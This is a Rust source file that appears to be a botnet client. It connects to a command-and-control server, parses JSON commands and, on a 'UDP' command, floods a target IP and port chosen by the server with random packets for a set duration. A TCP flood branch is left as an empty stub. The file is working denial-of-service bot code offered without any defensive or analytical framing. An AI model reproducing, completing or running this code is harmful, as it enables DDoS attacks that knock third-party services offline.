use std::net::{TcpStream, Shutdown};
use std::io::{Read};
use serde_json::{Value, from_str};
use std::net::UdpSocket;
use std::{time, thread};
use rand::{thread_rng, Rng};


fn main() {
    let server_addr = "127.0.0.1:6969"; // TODO: change
    match TcpStream::connect(server_addr) {
        Ok(mut stream) => {
            println!("Successfully connected to server at {}", server_addr);
            
            // Main loop to listen for commands
            loop {
                let mut data = [0 as u8; 100]; // using 50 byte buffer
                match stream.read(&mut data) {
                    Ok(size) => {
                        // Handle incoming data
                        if size > 0 {
                            handle_command(&data[0..size]);
                        }
                    },
                    Err(e) => {
                        println!("Failed to receive data: {}", e);
                        stream.shutdown(Shutdown::Both).unwrap();
                        break;
                    }
                }
            }
        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}

fn generate_random_bytes(packet_size: usize) -> Vec<u8> {
    let size = if packet_size == 0 {
        thread_rng().gen_range(1..=1024-64) + 64
    } else {
        packet_size
    };

    let mut bytes = vec![0u8; size];
    thread_rng().fill(bytes.as_mut_slice());
    bytes
}

fn send_udp(target: &str, message: Vec<u8>, delay: u64) -> std::io::Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0")?; // bind to a random port
    socket.send_to(&message, target)?;
    println!("Sending packets");
    thread::sleep(time::Duration::from_millis(delay));
    Ok(())
}

fn udp_flood(target: &str, duration: u64, packet_size: usize) {
    let start = time::Instant::now();
    let interval = 10;

    while start.elapsed() < time::Duration::from_secs(duration) {
        let message = generate_random_bytes(packet_size);
        if let Err(e) = send_udp(target, message, interval) {
            eprintln!("Failed to send UDP packet: {}", e);
            continue;
        }
    }
}

fn handle_command(data: &[u8]) {
    // Convert bytes to string
    let text = match std::str::from_utf8(data) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("Failed to parse command as UTF-8 string: {}", e);
            return;
        }
    };

    // Parse string as JSON
    let command = match from_str::<Value>(text) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to parse command as JSON: {}", e);
            return;
        }
    };

    // Handle command based on its type
    match command["type"].as_str() {
        Some("UDP") => {
            // Handle UDP Flood
            // Extract IP, port, and duration from the command and perform UDP flooding
            let ip_addr = command["ip"].as_str().unwrap_or_default();
            let port = command["port"].as_i64().unwrap_or_default() as u16;
            let target = format!("{}:{}", ip_addr, port);
            let duration = command["seconds"].as_u64().unwrap_or_default();

            udp_flood(&target, duration, 0);
        },
        Some("TCP") => {
            // Handle TCP Flood
            // Similar handling as above
        },
        _ => println!("Unknown command received"),
    }
}
